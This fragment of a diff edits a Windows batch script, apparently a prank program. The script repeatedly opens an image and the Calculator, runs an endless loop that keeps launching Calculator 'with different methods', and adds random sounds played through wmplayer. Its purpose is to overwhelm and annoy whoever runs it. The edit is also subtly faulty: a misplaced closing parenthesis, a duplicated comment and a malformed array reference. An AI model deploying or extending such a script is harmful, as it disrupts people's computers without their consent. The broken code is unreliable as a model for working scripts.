@@ -25,8 +25,12 @@ start "" C:\Windows\System32\calc.exe
 for /l %%i in (1,1,%veces%) do (
     start "" "%imagen%"
     ping 127.0.0.1 -n 1 -w 200 >nul
-)
+
 ::reproducir un sonido aleatorio 
+   :: Reproducir un sonido aleatorio
+    set /a sonido_random=!random! %% 5
+    start "" wmplayer "%sonidos[%sonido_random%]" >nul 2>&1
+)
 
 :: Bucle infinito para abrir la Calculadora (intentar con diferentes métodos)
 :inicio
